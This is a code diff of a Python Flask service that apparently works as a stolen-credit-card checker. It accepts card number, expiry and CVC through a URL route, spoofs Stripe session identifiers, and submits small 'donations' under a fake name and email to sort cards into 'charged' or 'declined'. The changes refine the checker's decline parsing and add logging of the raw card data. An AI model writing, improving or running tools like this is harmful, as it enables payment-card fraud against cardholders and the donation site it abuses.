@@ -1,9 +1,16 @@
-from flask import Flask, request, jsonify
+import requests
 import random
 import string
-import requests
+import json
+import logging
+from flask import Flask, jsonify, request
+from urllib.parse import unquote
 
 app = Flask(__name__)
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 def generate_random_string(length=10):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
@@ -20,15 +27,11 @@ def process_credit_card(cc_input):
         'cvc': parts[3].strip()
     }
 
-def make_donation(cc_input):
-    email = "darkboy3366@gmail.com"
-    name = "Dark Boy"
-    amount = 5
-    
+def make_donation(cc_input, email, name, amount=5):
     try:
         card_details = process_credit_card(cc_input)
     except ValueError as e:
-        return {"success": False, "message": str(e)}
+        return {"status": "declined", "message": str(e)}
     
     # Generate fresh session identifiers
     muid = f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
@@ -81,13 +84,18 @@ def make_donation(cc_input):
         )
         
         if stripe_response.status_code != 200:
-            return {"success": False, "message": "Stripe payment method creation failed", "response": stripe_response.text}
+            try:
+                error_data = stripe_response.json()
+                error_message = error_data.get('error', {}).get('message', 'Stripe payment method creation failed')
+                return {"status": "declined", "message": error_message}
+            except:
+                return {"status": "declined", "message": "Stripe payment method creation failed"}
         
         payment_method = stripe_response.json()
         payment_method_id = payment_method.get('id')
         
         if not payment_method_id:
-            return {"success": False, "message": "Could not get payment method ID from Stripe"}
+            return {"status": "declined", "message": "Could not get payment method ID from Stripe"}
        
         donation_headers = {
             'accept': '*/*',
@@ -145,22 +153,34 @@ def make_donation(cc_input):
         )
         
         if donation_response.status_code == 200:
-            return {"success": True, "message": "Donation successful"}
+            return {"status": "charged", "message": "Donation successful"}
         else:
-            return {"success": False, "message": "Donation submission failed", "response": donation_response.text}
+            try:
+                response_data = donation_response.json()
+                error_message = response_data.get('error', {}).get('message', 'Donation submission failed')
+                return {"status": "declined", "message": error_message}
+            except json.JSONDecodeError:
+                return {"status": "declined", "message": "Donation submission failed"}
             
     except Exception as e:
-        return {"success": False, "message": f"An error occurred: {str(e)}"}
+        return {"status": "declined", "message": f"An error occurred: {str(e)}"}
 
-@app.route('/gateway=stripe5$/key=rocky/cc=', methods=['GET'])
-def handle_donation():
-    cc_input = request.args.get('cc')
-    
-    if not cc_input:
-        return jsonify({"success": False, "message": "Missing required parameter: cc"}), 400
-    
-    result = make_donation(cc_input)
-    return jsonify(result)
+@app.route('/gateway=stripe5$/key=rocky/cc=<cc>', methods=['GET'])
+def handle_donation(cc):
+    try:
+        # Decode the cc parameter to handle URL-encoded characters
+        decoded_cc = unquote(cc)
+        logger.info(f"Received request with cc: {decoded_cc}")
+        result = make_donation(decoded_cc, "darkboy3366@gmail.com", "Dark Boy")
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"Server error: {str(e)}")
+        return jsonify({"status": "declined", "message": f"Server error: {str(e)}"}), 500
+
+@app.errorhandler(404)
+def page_not_found(e):
+    logger.warning(f"404 error: {str(e)}")
+    return jsonify({"status": "declined", "message": "Invalid endpoint or parameters"}), 404
 
 if __name__ == '__main__':
     app.run(debug=True)
